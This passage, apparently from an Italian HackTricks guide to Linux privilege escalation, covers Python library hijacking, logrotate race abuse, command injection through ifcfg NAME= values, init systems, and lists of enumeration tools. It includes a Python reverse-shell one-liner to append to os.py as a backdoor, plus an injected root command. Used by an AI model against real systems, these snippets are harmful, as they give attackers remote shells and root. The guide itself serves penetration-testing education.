~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Devi anche cercare file che contengono la parola "**password**" nel loro **nome** o all'interno del **contenuto**, e controllare anche la presenza di IP e email nei log, o hashes regexps.\
Non elencherò qui come fare tutto questo, ma se sei interessato puoi consultare gli ultimi controlli che [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) esegue.

## File scrivibili

### Python library hijacking

Se sai da **dove** verrà eseguito uno script python e puoi **scrivere in** quella cartella oppure puoi **modificare python libraries**, puoi modificare la libreria OS e backdoor it (se puoi scrivere dove verrà eseguito lo script python, copia e incolla la libreria os.py).

Per **backdoor the library** aggiungi semplicemente alla fine della libreria os.py la seguente riga (cambia IP e PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Sfruttamento di `logrotate`

Una vulnerabilità in `logrotate` permette a utenti con **permessi di scrittura** su un file di log o sulle sue directory padre di ottenere potenzialmente privilegi elevati. Questo perché `logrotate`, che spesso gira come **root**, può essere manipolato per eseguire file arbitrari, specialmente in directory come _**/etc/bash_completion.d/**_. È importante controllare i permessi non solo in _/var/log_ ma anche in qualsiasi directory in cui viene applicata la rotazione dei log.

> [!TIP]
> Questa vulnerabilità interessa `logrotate` versione `3.18.0` e precedenti

Maggiori dettagli sulla vulnerabilità sono disponibili a questa pagina: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Puoi sfruttare questa vulnerabilità con [**logrotten**](https://github.com/whotwagner/logrotten).

Questa vulnerabilità è molto simile a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** quindi ogni volta che trovi che puoi modificare i log, verifica chi li gestisce e controlla se puoi escalare i privilegi sostituendo i log con symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Riferimento alla vulnerabilità:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Se, per qualsiasi motivo, un utente è in grado di **scrivere** uno script `ifcf-<whatever>` in _/etc/sysconfig/network-scripts_ **o** di **modificare** uno esistente, allora il tuo **sistema è pwned**.

Gli script di rete, ad esempio _ifcg-eth0_, sono usati per le connessioni di rete. Sembrano esattamente file .INI. Tuttavia, vengono \~sourced\~ su Linux da Network Manager (dispatcher.d).

Nel mio caso, l'attributo `NAME=` in questi script di rete non viene gestito correttamente. Se nel nome ci sono **spazi bianchi/spazi vuoti**, il sistema tenta di eseguire la parte dopo lo spazio. Questo significa che **tutto ciò che segue il primo spazio viene eseguito come root**.

Per esempio: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Nota lo spazio vuoto tra Network e /bin/id_)

### **init, init.d, systemd, e rc.d**

La directory `/etc/init.d` ospita **script** per System V init (SysVinit), il **classico sistema di gestione dei servizi Linux**. Include script per `start`, `stop`, `restart` e talvolta `reload` dei servizi. Questi possono essere eseguiti direttamente o tramite link simbolici presenti in `/etc/rc?.d/`. Un percorso alternativo nei sistemi Redhat è `/etc/rc.d/init.d`.

D'altra parte, `/etc/init` è associato a **Upstart**, un più recente **sistema di gestione dei servizi** introdotto da Ubuntu, che utilizza file di configurazione per attività di gestione dei servizi. Nonostante la transizione a Upstart, gli script SysVinit sono ancora utilizzati insieme alle configurazioni Upstart grazie a un layer di compatibilità in Upstart.

**systemd** emerge come un moderno gestore di init e servizi, offrendo funzionalità avanzate come avvio on-demand dei daemon, gestione degli automount e snapshot dello stato del sistema. Organizza i file in `/usr/lib/systemd/` per i pacchetti di distribuzione e `/etc/systemd/system/` per le modifiche dell'amministratore, semplificando l'amministrazione del sistema.

## Altri trucchi

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks comunemente hook a syscall per esporre funzionalità privilegiate del kernel a un manager in userspace. Una debole autenticazione del manager (es. controlli di firma basati sull'ordine degli FD o schemi di password poveri) può permettere a un'app locale di impersonare il manager e scalare a root su dispositivi già rooted. Ulteriori informazioni e dettagli sull'exploit qui:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

La discovery di servizi guidata da regex in VMware Tools/Aria Operations può estrarre un path di un binario dalle command line dei processi ed eseguirlo con -v in un contesto privilegiato. Pattern permissivi (es. usando \S) possono corrispondere a listener staged dall'attacker in location scrivibili (es. /tmp/httpd), portando all'esecuzione come root (CWE-426 Untrusted Search Path).

Per saperne di più e vedere un pattern generalizzato applicabile ad altri stack di discovery/monitoring, vedi qui:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protezioni di sicurezza del kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Ulteriori risorse

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Miglior tool per cercare vettori di local privilege escalation su Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilità del kernel in Linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accesso fisico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Raccolta di altri script**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Riferimenti

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
